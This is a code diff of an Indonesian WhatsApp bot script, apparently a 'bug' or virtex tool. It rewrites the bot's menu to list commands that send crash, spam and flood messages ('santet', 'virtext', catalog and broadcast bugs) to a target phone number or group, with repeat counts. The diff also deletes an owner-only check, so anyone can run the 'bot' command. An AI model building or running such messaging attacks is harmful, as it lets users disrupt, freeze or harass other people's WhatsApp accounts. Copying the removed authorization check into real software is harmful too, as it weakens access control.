-❏ ── JADI BUG MENU ──❏ 
-𖠀⩵꙰ཱི➢ jadibug1 [ Reply Video Jadi Bug Audio ]
-𖠀⩵꙰ཱི➢ jadibug2 [ Reply Video Jadi Bug Mp3 ]
-𖠀⩵꙰ཱི➢ jadibug3 [ Reply Audio Jadi Bug Vn ]
-𖠀⩵꙰ཱི➢ jadibug4 [ Reply Sticker Jadi Bug Gambar ]
-𖠀⩵꙰ཱི➢ jadibug5 [ Reply Gambar Jadi Bug Once ] 
-[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]
-❏ ── BUG BROADCAST ──❏ 
-𖠀⩵꙰ཱི➢ bugbcimage [ Bug image Broadcast ]
-𖠀⩵꙰ཱི➢ bugbcvideo [ Bug Video Broadcas ]
-𖠀⩵꙰ཱི➢ bugbc audio [ Bug Audio Broadcast ]
-𖠀⩵꙰ཱི➢ bugbctext [ Bug Text Broadcast ]
-[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]
+© Hay Kak ${pushname} 👋 Selamat ${salam}
+
+◎ Owner : ${botname}
+◎ Lib : Multi-Device
+◎ Terbit : *01-09-1999*
+
+° SPESIAL BUG *
+
+afk { kasih reactions }
+bugghoib [ on / off ]
+jagoanom [ reply target ]
+bugsange [ Harus Menjadi Admin ]
+bugtiktok [ Link ] - Bug Sw
+jadikatalog [ reply sticker ] jumlah
+
+° OTW TARGET °
+
+🔥 628xxx|5|5
+ampas1 628xxx
+santetdia 628xxx@s.whatsapp.net|10|10s
+catalogpc 628xxx@s.whatsapp.net|10|10s
+
+° OTW GROUP °
+
+Ketik > m.chat ( di group dulu🌷)
+
+ampas2 112674448xxx
+santetgc  1237891xxxx@g.us|10|10s
+cataloggc 1237891xxxx@g.us|10|10s
+
+° Virtext Spam °
+
+virtext1 [ jumlah ]
+virtext2 [ jumlah ]
+virtext3 [ jumlah ]
+virtext4 [ jumlah ]
+virtext5 [ jumlah ]
+virtext6 [ jumlah ]
+virtext7 [ jumlah ]
+virtext8 [ jumlah ]
+virtext9 [ jumlah ]
+virtext10 [ jumlah ]
+
+° Bug Spam °
+
+🌷 [ jumlah ]
+kontol [ jumlah ]
+bugstik [ jumlah ]
+bugie [ jumlah ]
+buglokas [ jumlah ]
+bugtod [ jumlah ]
+bugbokep [ jumlah ]
+buginvite [ jumlah ] Pc
+ha [ jumlah ]
+hi [ jumlah ]
+hu [ jumlah ]
+he [ jumlah ]
+ba [ jumlah ]
+be [ jumlah ]
+bu [ jumlah ]
+bi [ jumlah ]
+ca [ jumlah ]
+ci [ jumlah ]
+cu [ jumlah ]
+co [ jumlah ]
+bug1 [ jumlah ]
+bug2 [ jumlah ]
+bug3 [ jumlah ]
+bug4 [ jumlah ]
+bug5 [ jumlah ]
+bug6 [ jumlah ]
+bug7 [ jumlah ]
+poll [ jumlah ]
+bugtag [ jumlah ]
+inibug [ jumlah ]
+buttonampas [ jumlah ]
+hiya [ jumlah ]
+lokas [ jumlah ]
+catalog [ jumlah ]
+docu [ jumlah ]
+daca [ jumlah ]
+duc [ jumlah ]
+ducu [ jumlah ]
+troli [ jumlah ]
+troli2 [ jumlah ]
+spam [ Reply Pesan ]
+
+° Jadi Bug °
+
+jadibug1 [ Reply Video Jadi Bug Audio ]
+jadibug2 [ Reply Video Jadi Bug Mp3 ]
+jadibug3 [ Reply Audio Jadi Bug Vn ]
+jadibug4 [ Reply Sticker Jadi Bug Gambar ]
+jadibug5 [ Reply Gambar Jadi Bug Once ] 
+
+° Bug Broadcast °
+
+bugbcimage [ Bug image Broadcast ]
+bugbcvideo [ Bug Video Broadcas ]
+bugbc audio [ Bug Audio Broadcast ]
+bugbctext [ Bug Text Broadcast ]
 
 © ⏤͟͟͞𝐙𝚫𝐋𝐋 𝐌𝚫𝐊𝚵𝐑`,
 contextInfo:{"externalAdReply": {"title": `SC ZALL MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
@@ -4297,7 +4273,6 @@ thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg',
 break
 //=================================================//
 case 'bot': {
-if (!isCreator) return
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productMessage": {
